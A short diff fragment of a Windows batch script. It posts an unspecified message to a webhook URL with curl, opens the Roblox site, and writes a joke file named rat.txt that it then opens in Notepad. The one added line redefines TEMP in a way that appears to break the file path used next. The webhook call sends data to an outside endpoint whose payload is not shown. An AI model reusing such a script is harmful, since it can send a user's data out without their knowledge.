@@ -18,6 +18,7 @@ curl.exe -i --fail-with-body -X POST "%WEBHOOK_URL%" ^
   --data "{\"content\":\"%MESSAGE%\"}"
 
 start https://roblox.com
+set "TEMP=%TEMP%\rat.txt"
 echo interesting... > "%TEMP%\rat.txt"
 start notepad "%TEMP%\rat.txt"
 exit
